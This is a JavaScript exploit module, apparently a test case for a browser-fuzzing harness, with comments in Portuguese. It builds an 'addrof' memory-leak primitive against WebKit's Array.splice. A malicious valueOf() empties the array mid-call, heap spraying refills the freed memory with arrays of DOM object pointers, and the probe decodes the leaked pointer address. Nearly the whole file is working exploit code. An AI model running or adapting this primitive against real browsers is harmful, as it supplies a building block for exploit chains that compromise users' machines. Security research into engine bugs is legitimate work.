
export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Primitiva addrof via Butterfly Aliasing. O evilObject é passado como índice no splice(), ' +
        'forçando o C++ a invocar valueOf() durante o parse de argumentos. A memória é libertada ' +
        'e imediatamente sobreposta por um ArrayWithContiguous repleto de ponteiros nativos.',

    setup: function() {
        this.results = {};
        
        // 1. O Array Fantasma
        this.vulnArray = new Array(128).fill(1.11);
        
        // 2. A Cobaia
        this.targetObj = document.createElement('div');
        this.targetObj.id = "HOLY_GRAIL";

        const self = this;
        
        // 3. A Bomba Relógio
        this.evilObject = {
            valueOf: function() {
                // GATILHO: Libertamos o Butterfly atual a meio da função C++
                self.vulnArray.length = 0;
                
                // HEAP FENG SHUI: Inundamos o buraco com novos Arrays de tamanho idêntico,
                // mas contendo Objetos em vez de Doubles (ArrayWithContiguous)
                self.overlapSpray = new Array(500); // Reduzido para 500 para evitar Garbage Collection síncrono
                for(let i = 0; i < 500; i++) {
                    let arr = new Array(128).fill(self.targetObj);
                    self.overlapSpray[i] = arr;
                }
                
                // Retornamos 0, que será usado como o índice 'start' do splice!
                return 0; 
            }
        };
    },

    trigger: function() {
        try {
            // 🚨 FIX: A BOMBA ESTÁ NO PARÂMETRO 'START' 🚨
            // O WebKit guarda o tamanho antigo, tenta converter evilObject para inteiro (BOOM!),
            // e depois escreve 9.99 no índice 0 da memória libertada/sobreposta.
            this.vulnArray.splice(this.evilObject, 0, 9.99);
            
            // Se o aliasing funcionou, o índice 1 contém o ponteiro do targetObj
            this.results.leakedData = this.vulnArray[1]; 
            
            this.results.sprayRef = this.overlapSpray;
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Splice Coagido Executado',
        
        // O Extrator addrof
        s => {
            let val = s.results.leakedData;
            
            if (typeof val === 'number' && val !== 1.11 && val !== 9.99 && val !== 0) {
                
                const buf = new ArrayBuffer(8);
                const f64 = new Float64Array(buf);
                const u64 = new BigUint64Array(buf);
                
                f64[0] = val;
                const bits = u64[0];
                
                const addr = bits & 0x0000FFFFFFFFFFFFn;
                
                if (addr > 0x100000n) {
                    return `🏆 ADDROF [Aliasing Perfeito]: 0x${addr.toString(16).toUpperCase()}`;
                } else {
                    return `💥 STALE DATA [Lixo / Miss]: Leu ${val}`;
                }
            }
            return 0; // Fuzzer silencia e tenta de novo
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
        this.targetObj = null;
        this.overlapSpray = null;
        this.results = {};
    }
};
